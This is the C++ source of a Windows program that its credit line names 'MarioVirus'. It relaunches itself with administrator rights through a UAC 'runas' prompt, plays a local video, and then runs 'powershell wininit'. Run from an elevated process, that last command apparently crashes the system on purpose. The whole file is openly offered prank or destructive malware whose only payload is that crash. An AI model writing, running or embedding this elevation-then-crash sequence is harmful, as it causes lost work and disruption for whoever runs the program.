#include <iostream>
#include <windows.h>
#include <mmsystem.h> // Required for MCI
#include <thread> // Required for std::thread
#include <cstdlib>
#include <thread> // Required for std::this_thread::sleep_for
#include <chrono> // Required for std::chrono::seconds
#include <vector>


#pragma comment(lib, "winmm.lib") // Link with winmm.lib for MCI

void playVideo() {
    // Play a video
    mciSendString(R"(open "videoo.mpg" type mpegvideo alias myvideo)", NULL, 0, NULL);
    mciSendString("play myvideo wait", NULL, 0, NULL); // Add "wait" command

    // Close the video
    mciSendString("close myvideo", NULL, 0, NULL);
}

void createMessageBox() {
    MessageBox(NULL, "CAN I HAVE IT?", "Notification", MB_OK);
}

bool adminAccess() {
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation;
    DWORD cbSize = sizeof(TOKEN_ELEVATION);

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return false;
    }

    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &cbSize)) {
        CloseHandle(hToken);
        return elevation.TokenIsElevated != 0;
    }

    CloseHandle(hToken);
    return false;
}

int main() {

    // check if we have admin rights
    if (!adminAccess()) {
        // If not, relaunch the program with admin rights
        char szPath[MAX_PATH];
        if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath))) {
            SHELLEXECUTEINFO sei = { sizeof(sei) };
            sei.lpVerb = "runas";
            sei.lpFile = szPath;
            sei.hwnd = NULL;
            sei.nShow = SW_NORMAL;

            if (!ShellExecuteEx(&sei)) {
                DWORD dwError = GetLastError();
                if (dwError == ERROR_CANCELLED) {
                    // The user refused to allow privileges elevation.
                    // Do nothing ...
                }
            }
        }
    }


    std::cout << "Created by Satyamedh Hulyalkar \n https://github.com/satyamedh/MarioVirus \n https://satyamedh.me" << std::endl;


    // Start a new thread to play the video
    std::thread videoThread(playVideo);

    // Wait for the video to finish
    videoThread.join();

    system("powershell wininit");

    return 0;
}